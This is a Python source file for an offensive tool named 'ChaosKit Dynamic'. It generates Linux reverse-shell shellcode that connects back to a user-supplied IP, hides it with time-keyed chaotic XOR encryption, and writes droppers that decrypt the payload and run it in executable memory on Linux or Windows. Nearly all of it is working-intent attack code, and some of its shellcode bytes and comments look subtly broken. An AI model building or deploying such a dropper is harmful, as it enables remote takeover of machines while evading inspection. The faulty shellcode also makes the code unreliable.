import random
import os
import socket
import struct
import time
import hashlib
import pyfiglet
from colorama import Fore, Style, init
from geopy.geocoders import Nominatim
from geopy.exc import GeocoderTimedOut, GeocoderServiceError
from datetime import datetime
import pytz
import timezonefinder



# Initialize Colorama
init(autoreset=True)
def banner_art():
    print(""" 
    
                                                                                                                                                                                    
                                        ^d@@@@@@@@@@@@@@@@@Dr                                       
                                 *#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@B!                                
                             Q@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@8                            
                         P@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@}                        
                      H@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@L                     
                   =@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@#                   
                 d@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@=                
               6@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@=              
             Y@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@             
            @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@$           
          t@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@          
         #@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@~        
        @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@z       
       @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@m      
      @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@|     
     #@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@#=         ^@@@@@@@@@@@@@@     
    }@@@@@@@@@@@@@8t}tB@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@#                n@@@@@@@@@@@@    
    @@@@@@@@@@L           #@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@#     =#@@@@@@@@$    E@@@@@@@@@@z   
   8@@@@@@@@v      __       #@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@     @@@@@@@@@@@@@@@@  _@@@@@@@@@@   
   @@@@@@@@   #@@@@@@@@@@_   -@@@@@@@@@@@@@@@@@`@@@@@@@@@@@@@Q    @@@@@@@@@@@@@@@@@@@@n8@@@@@@@@@`  
  `@@@@@@@gx@@@@@@@@@@@@@@@_   B@@@@@@@@@@@@@@D @@@@@@@@@@@@c   B@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@#  
  B@@@@@@@@@@@@@@@@@@@@@@@@@#   ?@@@@@@@@@L#@@  X@@8-@@@@@@=   @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@  
  @@@@@@@@@@@@@@@@@@@@@@@@@@@@    @@@@@@@@: $@  .@#  @@@@@`  |@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@  
  @@@@@@@@@@d^.   =V#@@@@@@@@@-    L@@@@@@@  @   @  ~@@@@    `#@@@@@@@@@@@@@d             r@@@@@@@  
  @@@@@@@@#zYYv=        -#@@@        }@@@@@  @   @   @@8        @@@@@@@@Q       :m#@@@@@#h_ Z@@@@@  
  @@@@@@@@8^#@@@@@@@@6                  _~   @   @m              @@@@8     ~#@@@@@@@@@c  P@@@@@@@@  
  c@@@@Y    h@@@@@@@@@@@@D                  @@   @@g             @n     P@@@@@@@@@@@@@8    W@@@@@@  
   @@@n `   @@@@@8^         >         @@@=            B@             B@@@@@@@@@@@@@@@@@B    @@@@@r  
   @@@@@.  @@W                          P@@E-      L@@@?         6@@@@@@@@@@@@@@@@@@@@@x  z@@@@@@   
   _@@@@.                            Y@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@#_    @@@@@@6   
    @@@@@,     D@@@#                      L#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@#X`       w@@@@@@@    
     @@@@@@@   @@@@@8    ndn.                     ,LHg#@@@@@@@#B6hY>.              =   ?@@@@@@@     
     >@@@@@@d  @@@@@  c@@@@@@@,   m@@@@@@@@:                                 L@@@} 8   @@@@@@@X     
      z@@@@@@   @@@  @@@@@@@@@  x@@@@@@@@@@@@z      w@@@@@@@@@V     W@@@@@$  @@@@@    r@@@@@@8      
       w@@@@@8   *d  @@@@@@@@  _@@@@@@@@@@@@@@    6@@@@@@@@@@@@@8  r@@@@@@@  @@@@@    @@@@@@z       
        |@@@@@z      #@@@@@@@  @@@@@@@@@@@@@@@X   @@@@@@@@@@@@@@@  z@@@@@@@  V@@Q    Q@@@@@?        
          @@@@@h      !@@@@@@  #@@@@@@@@@@@@@@#  V@@@@@@@@@@@@@@@  B@@@@@@@   ~     @@@@@@          
           #@@@@B         _r,  `@@@@@@@@@@@@@@g  t@@@@@@@@@@@@@@@  @@@@@@6        r@@@@@#           
            !@@@@@    #?        ~@@@@@@@@@@@@@   ?@@@@@@@@@@@@@@   6Ex      6_   @@@@@@,            
              Z@@@@#    8 .@@@W       `rmB@@#     #@@@@@@@@@@@D          gD    Q@@@@@h              
                8@@@@#     .@@@* ##dv_                          d@@@@@       #@@@@@P                
                  Z@@@@@V         @@@@@@@@@@@@   @@@@@@@@@@@@@  @@@Q      m@@@@@@z                  
                    `@@@@@@E        *8@@@@@@@@   @@@@@@@@@@@m          Q@@@@@@#                     
                       r@@@@@@@#>                                 r#@@@@@@@@.                       
                           B@@@@@@@@@@8n=                 ,}8@@@@@@@@@@@W                           
                               d@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@L                               
                                    ,W@@@@@@@@@@@@@@@@@@@@@@@#w                                  
                                                                                    
                                                   
                                                                                                                                                        
    """ )


# Initialize Colorama
init(autoreset=True)

# Function to generate chaotic keys using logistic map
def generate_chaotic_keys(length, r, x0):
    x = x0
    chaotic_keys = []
    for _ in range(length):
        x = r * x * (1 - x)  # Logistic map equation
        chaotic_value = int(x * 255)  # Convert chaotic output to an integer between 0 and 255
        while chaotic_value == 0:  # Ensure the key is non-zero
            x = r * x * (1 - x)
            chaotic_value = int(x * 255)
        chaotic_keys.append(chaotic_value)
    return chaotic_keys

# XOR encryption/decryption
def xor_encrypt_decrypt(data, keys):
    result = bytearray()
    for i in range(len(data)):
        result.append(data[i] ^ keys[i])
    return result

# Time-based parameters with timezone adjustment
def get_hour_block_parameters(secret, tolerance=1, timezone_offset=0):
    """
    Generate r and x0 based on the current hour, a shared secret, and a timezone offset.
    Includes tolerance for neighbouring hour blocks.
    """
    current_hour = int((time.time() + timezone_offset * 3600) // 3600)  # Adjusted for timezone
    parameters = []
    for offset in range(-tolerance, tolerance + 1):
        combined = f"{secret}{current_hour + offset}"
        hash_value = hashlib.sha256(combined.encode()).hexdigest()
        x0 = int(hash_value[:8], 16) / 0xFFFFFFFF  # Normalised to [0, 1)
        r = 3.99 + (int(hash_value[8:12], 16) % 1000) / 100000  # Slight variation for r
        parameters.append((r, x0))
    return parameters

# Generate reverse shellcode template for Linux x64 TCP
def generate_linux_reverse_shell(ip, port):
    try:
        socket.inet_aton(ip)
    except socket.error:
        raise ValueError("Invalid IP address")
    if not (1 <= port <= 65535):
        raise ValueError("Invalid port number. Must be between 1 and 65535.")

    packed_ip = struct.unpack(">I", socket.inet_aton(ip))[0]
    packed_port = struct.pack(">H", port)

    shellcode = bytearray([
        0x48, 0x31, 0xff, 0x48, 0xf7, 0xe6, 0x04, 0x29, 0x0f, 0x05,     # syscall socket
        0x48, 0x89, 0xc7,                                               # mov rdi, rax
        0x48, 0x31, 0xc0, 0x50,                                         # push rax (zero)
        packed_port[0], packed_port[1],                                 # push port (network byte order)
        0x66, 0x68, (packed_ip >> 24) & 0xFF, (packed_ip >> 16) & 0xFF, # push IP address
        (packed_ip >> 8) & 0xFF, packed_ip & 0xFF,                      #
        0x48, 0x89, 0xe6,                                               # mov rsi, rsp
        0x04, 0x31, 0x0f, 0x05,                                         # syscall connect
        0x48, 0x31, 0xff, 0x57, 0x57, 0x57,                             # push /bin/sh
        0x5f, 0x6a, 0x3b, 0x58,                                         # pop rsp, syscall execve
        0x48, 0x89, 0xe7, 0x0f, 0x05
    ])
    return shellcode

# Function to get timezone offset between user and target locations
def get_timezone_offset(user_location, target_location):
    geolocator = Nominatim(user_agent="timezone_locator")
    try:
        # Get user location information
        user_location_info = geolocator.geocode(user_location, timeout=10)
        if user_location_info is None:
            raise ValueError("User location could not be determined.")

        target_location_info = geolocator.geocode(target_location, timeout=10)
        if target_location_info is None:
            raise ValueError("Target location could not be determined.")

        # Use latitude and longitude to get timezone
        from timezonefinder import TimezoneFinder
        tf = TimezoneFinder()

        user_timezone_str = tf.timezone_at(lng=user_location_info.longitude, lat=user_location_info.latitude)
        target_timezone_str = tf.timezone_at(lng=target_location_info.longitude, lat=target_location_info.latitude)

        if user_timezone_str is None or target_timezone_str is None:
            raise ValueError("Could not determine timezones from the given locations.")

        # Get timezone objects
        user_timezone = pytz.timezone(user_timezone_str)
        target_timezone = pytz.timezone(target_timezone_str)

        # Get current time in each timezone
        user_time = datetime.now(user_timezone)
        target_time = datetime.now(target_timezone)

        # Calculate the offset in hours
        offset = (target_time.utcoffset().total_seconds() - user_time.utcoffset().total_seconds()) / 3600
        return int(offset)

    except (GeocoderTimedOut, GeocoderServiceError) as e:
        print(Fore.RED + f"Error: Geocoding service is unavailable or timed out: {e}")
        return 0
    except Exception as e:
        print(Fore.RED + f"Error determining timezone offset: {e}")
        return 0

# Create a dropper script for Linux or Windows using hour-based decryption
def create_dropper_with_hour_based_decryption(encrypted_shellcode, platform, filename, shared_secret, timezone_offset=0):
    dropper_code = f"""
import time
import hashlib
import mmap
import ctypes

def generate_chaotic_keys(length, r, x0):
    x = x0
    chaotic_keys = []
    for _ in range(length):
        x = r * x * (1 - x)
        chaotic_value = int(x * 255)
        while chaotic_value == 0:
            x = r * x * (1 - x)
            chaotic_value = int(x * 255)
        chaotic_keys.append(chaotic_value)
    return chaotic_keys

def get_hour_block_parameters(secret, tolerance=1, timezone_offset=0):
    current_hour = int((time.time() + timezone_offset * 3600) // 3600)
    parameters = []
    for offset in range(-tolerance, tolerance + 1):
        combined = f"{{secret}}{{current_hour + offset}}"
        hash_value = hashlib.sha256(combined.encode()).hexdigest()
        x0 = int(hash_value[:8], 16) / 0xFFFFFFFF
        r = 3.99 + (int(hash_value[8:12], 16) % 1000) / 100000
        parameters.append((r, x0))
    return parameters

def xor_decrypt(data, keys):
    result = bytearray()
    for i in range(len(data)):
        result.append(data[i] ^ keys[i])
    return result

encrypted_shellcode = bytearray({list(encrypted_shellcode)})
shared_secret = "{shared_secret}"

parameters = get_hour_block_parameters(shared_secret, tolerance=1, timezone_offset={timezone_offset})
for r, x0 in parameters:
    keys = generate_chaotic_keys(len(encrypted_shellcode), r, x0)
    decrypted_shellcode = xor_decrypt(encrypted_shellcode, keys)
    if decrypted_shellcode.startswith(b'\x48\x31'):  # Validate shellcode structure
        shellcode = decrypted_shellcode
        break
else:
    raise ValueError("Decryption failed. Check the shared secret or time settings.")

if "{platform}" == "linux":
    exec_mem = mmap.mmap(-1, len(shellcode), mmap.MAP_PRIVATE | mmap.MAP_ANONYMOUS, mmap.PROT_READ | mmap.PROT_WRITE | mmap.PROT_EXEC)
    exec_mem.write(shellcode)
    exec_func = ctypes.CFUNCTYPE(None)(ctypes.addressof(ctypes.c_buffer(exec_mem, len(shellcode))))
    exec_func()
elif "{platform}" == "windows":
    size = len(shellcode)
    executable_memory = ctypes.windll.kernel32.VirtualAlloc(None, size, 0x3000, 0x40)
    if not executable_memory:
        raise MemoryError("Failed to allocate executable memory.")
    ctypes.memmove(executable_memory, ctypes.c_char_p(shellcode), size)
    func = ctypes.CFUNCTYPE(None)(executable_memory)
    func()
"""

    with open(filename, "w") as f:
        f.write(dropper_code)
    print(Fore.GREEN + f"Dropper saved to {filename}")

# Display a banner with PyFiglet
def display_banner():
    banner = pyfiglet.figlet_format("ChaosKit Dynamic")
    print(Fore.CYAN + banner)

# Display the menu with Colorama
def display_menu():
    print(Fore.YELLOW + "\n=== Shellcode Creator CLI ===")
    print(Fore.GREEN + "1. Create Linux Reverse Shellcode")
    print(Fore.GREEN + "2. Encrypt Shellcode with Hour-Based Parameters")
    print(Fore.GREEN + "3. Create Dropper with Hour-Based Decryption")
    print(Fore.GREEN + "4. Set Timezone Offset")
    print(Fore.RED + "5. Exit")

# Main program
def main():
    shellcode = None
    encrypted_shellcode = None
    shared_secret = "my-shared-secret"
    timezone_offset = 0

    # Display banner
    display_banner()

    while True:
        display_menu()
        choice = input(Fore.CYAN + "Enter your choice: ")

        if choice == "1":
            ip = input(Fore.CYAN + "Enter the target IP address for the reverse shell: ")
            port = int(input(Fore.CYAN + "Enter the target port number for the reverse shell: "))
            try:
                shellcode = generate_linux_reverse_shell(ip, port)
                print(Fore.GREEN + f"Linux Reverse shellcode created for IP {ip} and port {port}.")
            except ValueError as e:
                print(Fore.RED + f"Error: {e}")

        elif choice == "2":
            if shellcode is None:
                print(Fore.RED + "No shellcode to encrypt. Create shellcode first.")
            else:
                r, x0 = get_hour_block_parameters(shared_secret, timezone_offset=timezone_offset)[0]
                keys = generate_chaotic_keys(len(shellcode), r, x0)
                encrypted_shellcode = xor_encrypt_decrypt(shellcode, keys)
                print(Fore.GREEN + f"Encrypted Shellcode: {encrypted_shellcode.hex()}")

        elif choice == "3":
            if encrypted_shellcode is None:
                print(Fore.RED + "No encrypted shellcode available. Encrypt shellcode first.")
            else:
                platform = input(Fore.CYAN + "Enter target platform (linux/windows): ").lower()
                filename = input(Fore.CYAN + "Enter filename for the dropper script: ")
                create_dropper_with_hour_based_decryption(encrypted_shellcode, platform, filename, shared_secret, timezone_offset)

        elif choice == "4":
            user_location = input(Fore.CYAN + "Enter your current location (city, country): ")
            target_location = input(Fore.CYAN + "Enter target location (city, country): ")
            timezone_offset = get_timezone_offset(user_location, target_location)
            print(Fore.GREEN + f"Timezone offset calculated to {timezone_offset} hours.")

        elif choice == "5":
            print(Fore.YELLOW + "Exiting... Goodbye!")
            break

        else:
            print(Fore.RED + "Invalid choice. Please try again.")

if __name__ == "__main__":
    banner_art()
    time.sleep(5)
    main()
